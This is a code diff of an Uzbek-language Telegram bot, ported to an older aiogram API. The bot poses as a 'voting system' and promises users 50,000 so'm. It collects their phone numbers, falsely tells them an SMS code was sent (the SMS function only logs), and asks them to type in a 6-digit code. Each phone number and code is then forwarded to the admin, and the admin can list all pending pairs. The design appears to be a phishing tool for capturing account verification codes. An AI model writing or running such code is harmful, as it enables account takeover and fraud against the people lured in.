@@ -4,7 +4,7 @@ import asyncpg
 import os
 import logging
 from aiogram import Bot, Dispatcher, types
-from aiogram.filters import Command
+from aiogram.contrib.middlewares.logging import LoggingMiddleware
 from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
 from dotenv import load_dotenv
 
@@ -17,13 +17,12 @@ load_dotenv()
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
-
-# Render PostgreSQL ulanish
 DATABASE_URL = os.getenv("DATABASE_URL")
 
 # ================= BOT =================
 bot = Bot(token=BOT_TOKEN)
-dp = Dispatcher()
+dp = Dispatcher(bot)
+dp.middleware.setup(LoggingMiddleware())
 
 # Foydalanuvchi holatlari
 user_states = {}
@@ -33,23 +32,24 @@ admin_states = {}
 
 # Telefon raqam tugmasi
 phone_keyboard = ReplyKeyboardMarkup(
-    keyboard=[[KeyboardButton(text="📞 Telefon raqamni yuborish", request_contact=True)]],
+    keyboard=[
+        [KeyboardButton("📞 Telefon raqamni yuborish", request_contact=True)]
+    ],
     resize_keyboard=True
 )
 
 # Admin tugmalari
 admin_menu = ReplyKeyboardMarkup(
     keyboard=[
-        [KeyboardButton(text="📊 Statistika")],
-        [KeyboardButton(text="📨 Barchaga xabar")],
-        [KeyboardButton(text="📋 Kutayotgan kodlar")]
+        [KeyboardButton("📊 Statistika")],
+        [KeyboardButton("📨 Barchaga xabar")],
+        [KeyboardButton("📋 Kutayotgan kodlar")]
     ],
     resize_keyboard=True
 )
 
-# ================= POSTGRESQL (RENDER) =================
+# ================= POSTGRESQL =================
 async def get_db():
-    """Render PostgreSQL ga ulanish"""
     try:
         conn = await asyncpg.connect(DATABASE_URL)
         return conn
@@ -58,7 +58,6 @@ async def get_db():
         raise
 
 async def init_db():
-    """Jadvallarni yaratish"""
     conn = await get_db()
     try:
         await conn.execute("""
@@ -102,49 +101,44 @@ async def init_db():
             )
         """)
         
-        logger.info("✅ Database tables created successfully")
+        logger.info("✅ Database tables created")
     except Exception as e:
         logger.error(f"Database init error: {e}")
         raise
     finally:
         await conn.close()
 
-# ================= SMS YUBORISH =================
+# ================= SMS =================
 async def send_sms(phone: str, code: str):
-    """SMS yuborish (simulyatsiya)"""
-    logger.info(f"📨 SMS yuborildi: {phone} -> Kod: {code}")
-    # Real SMS xizmat qo'shing
+    logger.info(f"📨 SMS: {phone} -> Kod: {code}")
     return True
 
-# ================= 1. BOSHLASH =================
-@dp.message(Command("start"))
+# ================= 1. START =================
+@dp.message_handler(commands=['start'])
 async def start(message: types.Message):
     telegram_id = message.from_user.id
     
-    # Admin bo'lsa
     if telegram_id == ADMIN_ID:
         await message.answer(
-            "👋 *Admin paneliga xush kelibsiz!*\n\n"
-            "📊 Statistika - foydalanuvchilar soni\n"
-            "📨 Barchaga xabar yuborish\n"
-            "📋 Kutayotgan kodlar",
+            "👋 *Admin paneliga xush kelibsiz!*",
             parse_mode="Markdown",
             reply_markup=admin_menu
         )
         return
     
-    # Oddiy foydalanuvchi
     user_states[telegram_id] = "waiting_phone"
     await message.answer(
-        "🇺🇿 *Ovoz berish tizimi*\n\n"
-        "📱 Iltimos, telefon raqamingizni yuboring:",
+        "🇺🇿 *Ovoz berish tizimi*\n\n📱 Telefon raqamingizni yuboring:",
         reply_markup=phone_keyboard,
         parse_mode="Markdown"
     )
 
-# ================= 2. TELEFON RAQAM =================
-@dp.message(lambda msg: msg.contact is not None and msg.from_user.id != ADMIN_ID)
+# ================= 2. TELEFON =================
+@dp.message_handler(content_types=['contact'])
 async def receive_phone(message: types.Message):
+    if message.from_user.id == ADMIN_ID:
+        return
+    
     phone = message.contact.phone_number
     telegram_id = message.from_user.id
     
@@ -177,30 +171,25 @@ async def receive_phone(message: types.Message):
     await send_sms(phone, code)
     
     await message.answer(
-        f"✅ *{phone}* raqamiga kod yuborildi!\n\n"
-        f"📨 SMS da kelgan *6 xonali kodni* kiriting:",
+        f"✅ *{phone}* raqamiga kod yuborildi!\n\n📨 Kodni kiriting:",
         parse_mode="Markdown"
     )
     
     await bot.send_message(
         ADMIN_ID,
-        f"📱 *Yangi foydalanuvchi*\n"
-        f"👤 ID: `{telegram_id}`\n"
-        f"📞 Telefon: `{phone}`\n"
-        f"🔑 Kod: `{code}`\n"
-        f"⏳ Holat: *Kod yuborildi*",
+        f"📱 *Yangi foydalanuvchi*\n👤 ID: `{telegram_id}`\n📞 Telefon: `{phone}`\n🔑 Kod: `{code}`",
         parse_mode="Markdown"
     )
 
-# ================= 3. KODNI QABUL QILISH =================
-@dp.message(lambda msg: user_states.get(msg.from_user.id) == "waiting_code")
+# ================= 3. KOD =================
+@dp.message_handler(lambda msg: user_states.get(msg.from_user.id) == "waiting_code")
 async def receive_code(message: types.Message):
     code = message.text.strip()
     telegram_id = message.from_user.id
     phone = user_phones.get(telegram_id)
     
     if not phone or len(code) != 6 or not code.isdigit():
-        await message.answer("❌ 6 xonali kodni kiriting:")
+        await message.answer("❌ 6 xonali kod kiriting:")
         return
     
     conn = await get_db()
@@ -211,17 +200,13 @@ async def receive_code(message: types.Message):
         )
         
         if existing:
-            await message.answer(
-                "⏳ *Kod qabul qilindi!*\n\n"
-                "Admin tomonidan tekshirilmoqda...",
-                parse_mode="Markdown"
-            )
+            await message.answer("⏳ *Kod qabul qilindi!* Admin tekshirmoqda...", parse_mode="Markdown")
             
             keyboard = InlineKeyboardMarkup(
                 inline_keyboard=[
                     [
                         InlineKeyboardButton(
-                            text="✅ Tasdiqlash (+50 000 so'm)",
+                            text="✅ Tasdiqlash (+50 000)",
                             callback_data=f"verify_{telegram_id}_{phone}_{code}"
                         )
                     ],
@@ -236,29 +221,21 @@ async def receive_code(message: types.Message):
             
             await bot.send_message(
                 ADMIN_ID,
-                f"🔑 *Kod kelib tushdi!*\n\n"
-                f"👤 Foydalanuvchi ID: `{telegram_id}`\n"
-                f"📞 Telefon: `{phone}`\n"
-                f"🔢 Kod: `{code}`\n\n"
-                f"✅ Kodni tasdiqlang yoki rad eting:",
+                f"🔑 *Kod kelib tushdi!*\n👤 ID: `{telegram_id}`\n📞 Telefon: `{phone}`\n🔢 Kod: `{code}`",
                 parse_mode="Markdown",
                 reply_markup=keyboard
             )
             
             user_states[telegram_id] = "verified"
         else:
-            await message.answer(
-                "❌ *Noto'g'ri kod!*\n\n"
-                "Qaytadan urinib ko'ring.",
-                parse_mode="Markdown"
-            )
+            await message.answer("❌ *Noto'g'ri kod!*", parse_mode="Markdown")
     finally:
         await conn.close()
 
 # ================= 4. ADMIN TASDIQLASH =================
-@dp.callback_query(lambda c: c.data.startswith(("verify_", "reject_")))
-async def admin_action(callback: types.CallbackQuery):
-    data = callback.data.split("_")
+@dp.callback_query_handler(lambda c: c.data.startswith(("verify_", "reject_")))
+async def admin_action(callback_query: types.CallbackQuery):
+    data = callback_query.data.split("_")
     action = data[0]
     
     if action == "verify":
@@ -281,27 +258,21 @@ async def admin_action(callback: types.CallbackQuery):
                 )
                 
                 await conn.execute(
-                    "INSERT INTO transactions (telegram_id, amount, type) "
-                    "VALUES ($1, 50000, 'bonus')",
+                    "INSERT INTO transactions (telegram_id, amount, type) VALUES ($1, 50000, 'bonus')",
                     telegram_id
                 )
                 
                 await bot.send_message(
                     telegram_id,
-                    "✅ *Tasdiqlandi!* 🎉\n\n"
-                    "💰 Hisobingizga *50 000 so'm* qo'shildi!\n\n"
-                    "Rahmat! ✅",
+                    "✅ *Tasdiqlandi!* 🎉\n\n💰 Hisobingizga *50 000 so'm* qo'shildi!",
                     parse_mode="Markdown"
                 )
                 
-                await callback.message.edit_text(
-                    f"✅ *Foydalanuvchi tasdiqlandi!*\n"
-                    f"👤 ID: `{telegram_id}`\n"
-                    f"📞 Telefon: `{phone}`\n"
-                    f"💰 +50 000 so'm",
+                await callback_query.message.edit_text(
+                    f"✅ *Tasdiqlandi!*\n👤 ID: `{telegram_id}`\n📞 Telefon: `{phone}`\n💰 +50 000 so'm",
                     parse_mode="Markdown"
                 )
-                await callback.answer("✅ Tasdiqlandi!")
+                await callback_query.answer("✅ Tasdiqlandi!")
         finally:
             await conn.close()
     
@@ -311,49 +282,38 @@ async def admin_action(callback: types.CallbackQuery):
         conn = await get_db()
         try:
             await conn.execute(
-                "UPDATE sms_codes SET status = 'expired' "
-                "WHERE telegram_id = $1 AND status = 'pending'",
+                "UPDATE sms_codes SET status = 'expired' WHERE telegram_id = $1 AND status = 'pending'",
                 telegram_id
             )
             
             await bot.send_message(
                 telegram_id,
-                "❌ *Kod rad etildi!*\n\n"
-                "Iltimos, qaytadan urinib ko'ring.",
+                "❌ *Kod rad etildi!* Qaytadan urinib ko'ring.",
                 parse_mode="Markdown"
             )
             
-            await callback.message.edit_text(
-                f"❌ *Foydalanuvchi rad etildi!*\n"
-                f"👤 ID: `{telegram_id}`",
+            await callback_query.message.edit_text(
+                f"❌ *Rad etildi!*\n👤 ID: `{telegram_id}`",
                 parse_mode="Markdown"
             )
-            await callback.answer("❌ Rad etildi")
+            await callback_query.answer("❌ Rad etildi")
         finally:
             await conn.close()
 
-# ================= 5. ADMIN MENU =================
-@dp.message(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📊 Statistika")
+# ================= 5. ADMIN STATISTIKA =================
+@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📊 Statistika")
 async def admin_stats(message: types.Message):
     conn = await get_db()
     try:
         users_count = await conn.fetchval("SELECT COUNT(*) FROM users")
         total_balance = await conn.fetchval("SELECT COALESCE(SUM(balance), 0) FROM users")
-        today = await conn.fetchval(
-            "SELECT COUNT(*) FROM users WHERE DATE(created_at) = CURRENT_DATE"
-        )
-        pending = await conn.fetchval(
-            "SELECT COUNT(*) FROM sms_codes WHERE status = 'pending'"
-        )
-        verified = await conn.fetchval(
-            "SELECT COUNT(*) FROM sms_codes WHERE status = 'verified'"
-        )
+        pending = await conn.fetchval("SELECT COUNT(*) FROM sms_codes WHERE status = 'pending'")
+        verified = await conn.fetchval("SELECT COUNT(*) FROM sms_codes WHERE status = 'verified'")
         
         await message.answer(
             f"📊 *Statistika*\n\n"
             f"👥 Foydalanuvchilar: *{users_count}*\n"
             f"💰 Jami balans: *{total_balance:,} so'm*\n"
-            f"📅 Bugun: *{today}*\n\n"
             f"⏳ Kutayotgan: *{pending}*\n"
             f"✅ Tasdiqlangan: *{verified}*",
             parse_mode="Markdown"
@@ -362,7 +322,7 @@ async def admin_stats(message: types.Message):
         await conn.close()
 
 # ================= 6. KUTAYOTGAN KODLAR =================
-@dp.message(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📋 Kutayotgan kodlar")
+@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📋 Kutayotgan kodlar")
 async def pending_codes(message: types.Message):
     conn = await get_db()
     try:
@@ -373,12 +333,7 @@ async def pending_codes(message: types.Message):
         if codes:
             text = "📋 *Kutayotgan kodlar:*\n\n"
             for c in codes:
-                text += f"👤 ID: `{c['telegram_id']}`\n"
-                text += f"📞 Telefon: `{c['phone']}`\n"
-                text += f"🔑 Kod: `{c['code']}`\n"
-                text += f"⏰ {c['created_at']}\n"
-                text += "-" * 20 + "\n"
-            
+                text += f"👤 ID: `{c['telegram_id']}`\n📞 Telefon: `{c['phone']}`\n🔑 Kod: `{c['code']}`\n⏰ {c['created_at']}\n---\n"
             await message.answer(text, parse_mode="Markdown")
         else:
             await message.answer("📭 Kutayotgan kodlar yo'q")
@@ -386,17 +341,15 @@ async def pending_codes(message: types.Message):
         await conn.close()
 
 # ================= 7. BARCHAGA XABAR =================
-@dp.message(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📨 Barchaga xabar")
+@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📨 Barchaga xabar")
 async def send_all_start(message: types.Message):
     admin_states[ADMIN_ID] = "waiting_message"
     await message.answer(
-        "📨 *Barchaga xabar yuborish*\n\n"
-        "Xabar matnini yozing:\n"
-        "(Bekor qilish /cancel)",
+        "📨 *Barchaga xabar yuborish*\n\nXabar matnini yozing:",
         parse_mode="Markdown"
     )
 
-@dp.message(lambda msg: msg.from_user.id == ADMIN_ID and admin_states.get(ADMIN_ID) == "waiting_message")
+@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and admin_states.get(ADMIN_ID) == "waiting_message")
 async def send_all_message(message: types.Message):
     if message.text == "/cancel":
         admin_states.pop(ADMIN_ID, None)
@@ -442,9 +395,7 @@ async def send_all_message(message: types.Message):
         )
         
         await message.answer(
-            f"✅ *Xabar yuborildi!*\n\n"
-            f"✅ Yuborildi: *{sent}*\n"
-            f"❌ Yuborilmadi: *{failed}*",
+            f"✅ *Xabar yuborildi!*\n✅ Yuborildi: *{sent}*\n❌ Yuborilmadi: *{failed}*",
             parse_mode="Markdown",
             reply_markup=admin_menu
         )
@@ -452,10 +403,9 @@ async def send_all_message(message: types.Message):
         await conn.close()
 
 # ================= 8. BALANS =================
-@dp.message(Command("balance"))
+@dp.message_handler(commands=['balance'])
 async def check_balance(message: types.Message):
     if message.from_user.id == ADMIN_ID:
-        await message.answer("👋 Admin panelda /start bosing")
         return
     
     conn = await get_db()
@@ -475,22 +425,11 @@ async def check_balance(message: types.Message):
     finally:
         await conn.close()
 
-# ================= 9. CANCEL =================
-@dp.message(Command("cancel"))
-async def cancel(message: types.Message):
-    if message.from_user.id == ADMIN_ID:
-        admin_states.pop(ADMIN_ID, None)
-        await message.answer("❌ Bekor qilindi!", reply_markup=admin_menu)
-
-# ================= 10. MAIN =================
+# ================= 9. MAIN =================
 async def main():
     logger.info("🤖 Bot ishga tushmoqda...")
-    
-    # Ma'lumotlar bazasini tayyorlash
     await init_db()
-    
-    # Botni ishga tushirish
-    await dp.start_polling(bot)
+    await dp.start_polling()
 
 if __name__ == "__main__":
     asyncio.run(main())
